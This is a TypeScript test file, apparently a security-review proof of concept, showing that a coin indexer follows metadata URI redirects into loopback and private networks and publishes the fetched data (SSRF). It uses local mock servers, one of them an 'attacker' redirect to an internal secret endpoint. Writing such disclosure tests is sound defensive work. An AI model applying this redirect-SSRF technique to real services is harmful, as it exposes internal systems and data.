/**
 * PoC for finding M-3: the indexer fetches every coin's metadata `uri` (any coin created on
 * the program, not only app launches: the program accepts any string) with redirects
 * followed and no destination filtering. A coin whose uri points at (or redirects to) the
 * Railway private network / loopback / link-local makes the indexer issue that request, and
 * any `description`/`image`/`website`/`twitter`/`telegram` string in the JSON response is
 * stored and served publicly by the API (read-SSRF for JSON endpoints); connection errors
 * are stored too (`metadata.error`), which maps internal hosts/ports.
 *
 * Run (from services/):  node --import tsx --test ../security-review/services-poc/metadata-ssrf.test.ts
 */
import assert from "node:assert/strict";
import { createServer } from "node:http";
import type { AddressInfo } from "node:net";
import { after, it } from "node:test";

import { ChainSync } from "../../services/indexer/src/chainSync.ts";

// "Internal" service on loopback that should never be reachable from coin metadata.
const internal = createServer((req, res) => {
  if (req.url === "/secret") return void res.writeHead(200, { "content-type": "application/json" }).end(JSON.stringify({ description: "INTERNAL-ONLY DATA" }));
  res.writeHead(404).end();
});
// Attacker-controlled public URL that just redirects inward.
const attacker = createServer((_req, res) => {
  const { port } = internal.address() as AddressInfo;
  res.writeHead(302, { location: `http://127.0.0.1:${port}/secret` }).end();
});
await new Promise<void>((r) => internal.listen(0, "127.0.0.1", r));
await new Promise<void>((r) => attacker.listen(0, "127.0.0.1", r));
after(() => {
  internal.close();
  attacker.close();
});

it("follows a redirect into the private network and stores the response for the public API", async () => {
  const { port } = attacker.address() as AddressInfo;
  let stored: Record<string, unknown> | undefined;
  const db = {
    async query(sql: string, params: unknown[]) {
      if (sql.startsWith("SELECT uri")) return { rows: [{ uri: `http://127.0.0.1:${port}/m.json`, metadata: null }] };
      if (sql.startsWith("UPDATE coins SET metadata")) stored = JSON.parse(params[1] as string);
      return { rows: [] };
    },
  };
  const sync = new ChainSync({} as never, db as never, { warn() {} } as never, { debounceMs: 0, fetchMetadata: true });
  await (sync as unknown as { fetchMetadata(m: string): Promise<void> }).fetchMetadata("AnyMint");
  assert.equal(stored?.description, "INTERNAL-ONLY DATA");
});
